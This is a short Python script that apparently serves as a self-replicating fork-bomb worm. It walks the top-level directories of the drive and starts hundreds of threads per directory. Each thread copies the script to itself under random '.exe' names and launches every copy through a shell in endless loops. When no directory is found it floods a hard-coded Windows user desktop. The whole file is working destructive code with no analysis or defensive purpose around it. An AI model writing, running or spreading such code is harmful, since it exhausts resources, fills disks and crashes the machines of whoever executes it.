import random as r
import os 
import threading
import time
import shutil
import subprocess

NOTI = 500
F_ex = '.exe'

def tags(): #Works
    tag = ''.join(str(r.randint(0, 9)) for _ in range(8))
    return tag

def create_1(dst, name): #Prior i did not add .py/.exe and the wrong file (.txt) was being searched for
    while Active_Thread == True:

        shutil.copy(__file__, f"{dst}/{name}{F_ex}")
        time.sleep(1)
        subprocess.run(['start', f"{dst}/{name}{F_ex}"], shell=True)

def create_2(dst, name):
     while Active_Thread == True:

        shutil.copy(__file__, f"{dst}/{name}{F_ex}")
        time.sleep(1)
        subprocess.run(['start', f"{dst}/{name}{F_ex}"], shell=True)

def create_file3(dst, name): # Diff name, should exc when dir not avaiable. (F)

    while Active_Thread == True:
        if dst == 'F':
            shutil.copy(__file__, f"{name}{F_ex}")
            subprocess.run(['start', f"{name}{F_ex}"], shell=True)
    

def file_run(dst, name):
    #Should use any extra time to run another file.
    #LINKED to one, so every stack gets its own extra.
    subprocess.run(['start', f"{dst}/{name}{F_ex}"], shell=True)

while True:
    for dir in os.listdir('/'):
        Active_Thread = True
        CUSTOMTAG = f"FILE{tags()}" #Tag for only num 1, allows threading for second file.
        if os.path.isdir(dir):

            #print(f'\x1b[6;30;42m' + 'DIR {dir} ACESSED!' + '\x1b[0m') #For testing purposes 
            try:
                for _ in range(NOTI):
                    threading.Thread(target=create_1, args=(dir, CUSTOMTAG)).start()
                    threading.Thread(target=file_run, args=(dir, CUSTOMTAG)).start()
                    threading.Thread(target=create_2, args=(dir, f"FILE{tags()}")).start()

                Active_Thread = False

            except:
                for _ in range(NOTI):
                    threading.Thread(target=create_file3, args=("F", f"FILE{tags()}")).start()
                    threading.Thread(target=file_run, args=(dir, CUSTOMTAG)).start()
                    threading.Thread(target=create_file3, args=("F", f"FILE{tags()}")).start()

                Active_Thread = False

        else:
            for _ in range(NOTI):
                threading.Thread(target=create_1, args=("c:/Users/Sunny/OneDrive/Desktop", CUSTOMTAG)).start() #If no dir was found it will spam your desktop.
                threading.Thread(target=file_run, args=("c:/Users/Sunny/OneDrive/Desktop", CUSTOMTAG)).start()
            
                threading.Thread(target=create_file3, args=("F", f"FILE{tags()}")).start()
                threading.Thread(target=create_file3, args=("F", f"FILE{tags()}")).start()
            Active_Thread = False
        
